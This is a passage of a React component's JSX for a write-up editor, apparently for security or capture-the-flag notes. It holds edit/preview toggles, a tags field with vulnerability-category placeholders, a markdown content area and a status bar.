                        display: 'flex',
                        alignItems: 'center',
                        gap: 6,
                        background: 'rgba(255,255,255,0.04)',
                        color: 'rgba(255,255,255,0.65)',
                        transition: 'all 0.15s',
                      }}
                      onMouseEnter={(e) => {
                        e.currentTarget.style.borderColor = 'rgba(110,231,183,0.35)';
                        e.currentTarget.style.color = '#6EE7B7';
                      }}
                      onMouseLeave={(e) => {
                        e.currentTarget.style.borderColor = 'rgba(255,255,255,0.1)';
                        e.currentTarget.style.color = 'rgba(255,255,255,0.65)';
                      }}
                    >
                      <Download size={12} />
                      Export .md
                    </button>
                    <div
                      style={{
                        display: 'flex',
                        gap: 0,
                        borderRadius: 6,
                        overflow: 'hidden',
                        border: '1px solid rgba(255,255,255,0.06)',
                      }}
                    >
                      <button
                        type="button"
                        onClick={() => setMode('edit')}
                        style={{
                          fontFamily: mono,
                          fontSize: 10,
                          fontWeight: 600,
                          padding: '6px 14px',
                          border: 'none',
                          cursor: 'pointer',
                          display: 'flex',
                          alignItems: 'center',
                          gap: 5,
                          transition: 'all 0.15s',
                          background: mode === 'edit' ? 'rgba(110,231,183,0.15)' : 'transparent',
                          color: mode === 'edit' ? '#6EE7B7' : 'rgba(255,255,255,0.35)',
                        }}
                      >
                        <Pencil size={11} />
                        Edit
                      </button>
                      <button
                        type="button"
                        onClick={() => setMode('preview')}
                        style={{
                          fontFamily: mono,
                          fontSize: 10,
                          fontWeight: 600,
                          padding: '6px 14px',
                          border: 'none',
                          borderLeft: '1px solid rgba(255,255,255,0.06)',
                          cursor: 'pointer',
                          display: 'flex',
                          alignItems: 'center',
                          gap: 5,
                          transition: 'all 0.15s',
                          background: mode === 'preview' ? 'rgba(110,231,183,0.15)' : 'transparent',
                          color: mode === 'preview' ? '#6EE7B7' : 'rgba(255,255,255,0.35)',
                        }}
                      >
                        <Eye size={11} />
                        Preview
                      </button>
                    </div>
                  </div>
                </div>

                {/* Tags row */}
                <div style={{ marginTop: 14, paddingTop: 14, borderTop: '1px solid rgba(255,255,255,0.04)' }}>
                  <label
                    style={{
                      fontFamily: mono,
                      fontSize: 9,
                      fontWeight: 600,
                      color: 'rgba(255,255,255,0.35)',
                      textTransform: 'uppercase',
                      letterSpacing: '0.5px',
                      display: 'block',
                      marginBottom: 6,
                    }}
                  >
                    Tags
                  </label>
                  {mode === 'edit' ? (
                    <>
                      <input
                        value={(selected.tags || []).join(', ')}
                        onChange={(e) => setTagsFromInput(selected.id, e.target.value)}
                        placeholder="sqli, rce, privesc, xxe, ssti…"
                        style={{
                          fontFamily: mono,
                          fontSize: 11,
                          color: '#E2E8F0',
                          background: 'rgba(255,255,255,0.03)',
                          border: '1px solid rgba(255,255,255,0.06)',
                          borderRadius: 5,
                          padding: '8px 10px',
                          outline: 'none',
                          width: '100%',
                          boxSizing: 'border-box',
                        }}
                      />
                      <TagPills tags={selected.tags} size="md" />
                    </>
                  ) : (
                    <TagPills tags={selected.tags} size="md" />
                  )}
                </div>
              </Card>

              {/* CONTENT AREA */}
              <div
                style={{
                  flex: 1,
                  minHeight: 0,
                  background: '#0D1117',
                  border: '1px solid rgba(255,255,255,0.04)',
                  borderTop: 'none',
                  display: 'flex',
                  flexDirection: 'column',
                }}
              >
                {mode === 'edit' ? (
                  <textarea
                    value={selected.content}
                    onChange={(e) => updateWriteup(selected.id, 'content', e.target.value)}
                    placeholder="Start writing your writeup..."
                    style={{
                      fontFamily: mono,
                      fontSize: 12,
                      lineHeight: '22px',
                      color: '#C9D1D9',
                      background: '#0B0F18',
                      border: 'none',
                      outline: 'none',
                      resize: 'none',
                      flex: 1,
                      padding: '20px 24px',
                      width: '100%',
                      boxSizing: 'border-box',
                      tabSize: 2,
                    }}
                    spellCheck={false}
                  />
                ) : (
                  <div
                    style={{
                      flex: 1,
                      overflowY: 'auto',
                      padding: '20px 28px',
                    }}
                  >
                    {renderPreview(selected.content)}
                  </div>
                )}
              </div>

              {/* BOTTOM BAR */}
              <div
                style={{
                  background: '#11151E',
                  border: '1px solid rgba(255,255,255,0.04)',
                  borderTop: 'none',
                  borderRadius: '0 0 10px 10px',
                  padding: '8px 20px',
                  display: 'flex',
                  alignItems: 'center',
                  gap: 16,
                  flexShrink: 0,
                  flexWrap: 'wrap',
                }}
              >
                <span style={{ fontFamily: mono, fontSize: 10, color: 'rgba(255,255,255,0.25)' }}>
                  {charCount} chars
                </span>
                <span style={{ fontFamily: mono, fontSize: 10, color: 'rgba(255,255,255,0.25)' }}>
                  {wordCount} words
                </span>
                <div style={{ flex: 1 }} />
                <div style={{ display: 'flex', alignItems: 'center', gap: 5 }}>
                  <Calendar size={10} style={{ color: 'rgba(255,255,255,0.2)' }} />
                  <span style={{ fontFamily: mono, fontSize: 10, color: 'rgba(255,255,255,0.25)' }}>
                    {selected.createdAt}
                  </span>
                </div>
                {selected.difficulty && (
                  <span
                    style={{
                      fontFamily: mono,
                      fontSize: 9,
                      fontWeight: 700,
                      padding: '2px 8px',
                      borderRadius: 4,
                      background: `${diffColorMap[selected.difficulty]}20`,
                      color: diffColorMap[selected.difficulty],
                    }}
                  >
                    {selected.difficulty}
                  </span>
                )}
                <TagPills tags={selected.tags} max={6} size="sm" />
              </div>
            </>
          )}
        </div>
      </div>
    </div>
  );
}
